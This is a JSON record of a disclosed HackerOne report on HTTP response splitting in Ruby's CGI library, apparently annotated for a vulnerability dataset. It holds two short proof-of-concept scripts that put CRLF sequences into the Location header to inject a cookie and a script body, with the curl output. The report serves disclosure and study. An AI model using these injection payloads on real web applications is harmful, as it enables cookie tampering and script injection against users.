{
  "reported_to": "Ruby",
  "reported_by": "htokumaru ",
  "title": "Ruby\u306eCGI\u30e9\u30a4\u30d6\u30e9\u30ea\u306bHTTP\u30ec\u30b9\u30dd\u30f3\u30b9\u5206\u5272\uff08HTTP\u30d8\u30c3\u30c0\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\uff09\u304c\u3042\u308a\u3001\u79d8\u5bc6\u60c5\u5831\u304c\u6f0f\u6d29\u3059\u308b",
  "content": "\nPoC1:\nCode 185 Bytes\n1#!/usr/bin/env ruby\n2require 'cgi'\n3cgi = CGI.new\n4url = \"http://example.jp\\r\\nSet-Cookie: foo=bar;\"     # External Parameter\n5print cgi.header({'status' => '302 Found', 'Location' => url})\nActual Result1:\nCode 225 Bytes\n1$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru\n2HTTP/1.1 302 Found\n3Date: Fri, 21 May 2021 00:46:33 GMT\n4Server: Apache/2.2.31 (Unix)\n5Set-Cookie: foo=bar;\n6Location: http://example.jp\n7Content-Length: 0\n8Content-Type: text/html\n9\n\u3053\u306e\u30b1\u30fc\u30b9\u3067\u306f\u4e0d\u6b63\u306a\u30af\u30c3\u30ad\u30fc\u304c\u6ce8\u5165\u3055\u308c\u308b\u3002\nPoC2:\nCode 206 Bytes\n1#!/usr/bin/env ruby\n2require 'cgi'\n3cgi = CGI.new\n4url = \"http://example.jp\\r\\nStatus: 500\\r\\n\\r\\n<script>alert(1)</script>\"  # External Parameter\n5print cgi.header({'status' => '302 Found', 'Location' => url})\nActual Result2:\nCode 274 Bytes\n1$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru\n2HTTP/1.1 500 Internal Server Error\n3Date: Fri, 21 May 2021 00:49:44 GMT\n4Server: Apache/2.2.31 (Unix)\n5Location: http://example.jp\n6Connection: close\n7Transfer-Encoding: chunked\n8Content-Type: text/html\n9\n10<script>alert(1)</script>\n11\n\u3053\u306e\u30b1\u30fc\u30b9\u3067\u306f500 Internal Server Error\u306e\u305f\u3081\u3001Location\u30d8\u30c3\u30c0\u306f\u7121\u8996\u3055\u308c\u3001JavaScript\u304c\u5b9f\u884c\u3055\u308c\u308b\u3002\nImpact\n\u610f\u56f3\u3057\u306a\u3044HTTP\u30ec\u30b9\u30dd\u30f3\u30b9\u30d8\u30c3\u30c0\u3084HTTP\u30ec\u30b9\u30dd\u30f3\u30b9\u30dc\u30c7\u30a3\u3092\u5916\u90e8\u304b\u3089\u6ce8\u5165\u3067\u304d\u307e\u3059\u3002\n\u5358\u7d14\u306aHTTP\u30d8\u30c3\u30c0\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u3067\u306f\u3001\u30af\u30c3\u30ad\u30fc\u306e\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u3084\u30ea\u30c0\u30a4\u30ec\u30af\u30c8\u7b49\u304c\u4e3b\u306a\u5f71\u97ff\u3068\u306a\u308a\u307e\u3059\u304c\u3001\u3053\u306e\u30b1\u30fc\u30b9\u3067\u306f\u3001\u30ec\u30b9\u30dd\u30f3\u30b9\u30dc\u30c7\u30a3\u304c\u6ce8\u5165\u3067\u304d\u308b\u305f\u3081\u3001\u4e0d\u6b63\u306aJavaScript\u5b9f\u884c\u306b\u53ca\u3076\u305f\u3081\u3001\u5f71\u97ff\u304c\u5927\u304d\u3044\u3068\u8003\u3048\u307e\u3059\u3002\n\u4ed6\u306e\u8a00\u8a9e\u306e\u5834\u5408\u3001PHP\u306eheader\u95a2\u6570\u306f \"\\r\" \"\\n\" \"\\r\\n\" \u7b49\u3092\u3059\u3079\u3066\u30a8\u30e9\u30fc\u306b\u3059\u308b\u305f\u3081\u3001\u4e0a\u8a18\u306e\u653b\u6483\u306f\u3067\u304d\u307e\u305b\u3093\u3002\n\u904e\u53bb\u306eWEBrick\u3084Puma\u306b\u3082\u985e\u4f3c\u306e\u8106\u5f31\u6027\u304c\u3042\u308a\u307e\u3057\u305f\u304c\u3001\u3053\u308c\u3089\u306f\u5358\u72ec\u306e\u30ad\u30e3\u30ea\u30c3\u30b8\u30ea\u30bf\u30fc\u30f3 \"\\r\" \u306b\u3088\u308b\u653b\u6483\u3057\u304b\u3067\u304d\u305a\u3001\u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7\u3068\u3057\u3066Nginx\u304c\u3042\u308c\u3070\u3001Nginx\u5074\u306b\u3066\u30a8\u30e9\u30fc\u306b\u306a\u308a\u307e\u3059\u3002\u3057\u305f\u304c\u3063\u3066\u3001\u73fe\u5b9f\u7684\u306a\u5371\u967a\u6027\u306f\u307b\u3068\u3093\u3069\u306a\u3044\u3068\u8003\u3048\u307e\u3059\u3002\nhttps://www.ruby-lang.org/en/news/2019/10/01/http-response-splitting-in-webrick-cve-2019-16254/\nhttps://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v\n\u4e00\u65b9\u3001\u4eca\u56de\u5831\u544a\u3057\u305f\u554f\u984c\u306f\u3001CGI\u306e\u4ed5\u69d8\u4e0a\u30a6\u30a7\u30d6\u30b5\u30fc\u30d0\u30fc\u3084\u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7\u5074\u3067\u30a8\u30e9\u30fc\u306b\u3059\u308b\u3053\u3068\u306f\u3067\u304d\u306a\u3044\u305f\u3081\u3001\u5f71\u97ff\u304c\u73fe\u5b9f\u7684\u3067\u3059\u3002\n\n",
  "severity": [
    7.1,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "HTTP Response Splitting"
  ],
  "screenshots": {},
  "disclosed_date": 1669272360,
  "report_url": "https://hackerone.com/reports/1204695",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a Ruby CGI script that includes a malicious URL with injected HTTP headers (e.g., 'http://example.jp\\r\\nSet-Cookie: foo=bar;')"
    ],
    [
      2,
      "Print the CGI header with the malicious URL as the 'Location' parameter and observe the injected headers in the HTTP response"
    ]
  ],
  "vuln_description": "The vulnerability is an HTTP Response Splitting (HTTP Header Injection) in Ruby's CGI library, where an attacker can inject arbitrary HTTP headers or even modify the response body by manipulating the 'Location' header with carriage returns and line feeds. This can lead to cookie injection, JavaScript execution, or other malicious actions.",
  "reason": "The attack is relatively straightforward, involving only the manipulation of a single input parameter (the 'Location' header) with known HTTP response splitting techniques. The interaction between the injected headers and the CGI library's behavior is well-documented and not particularly subtle or complex.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}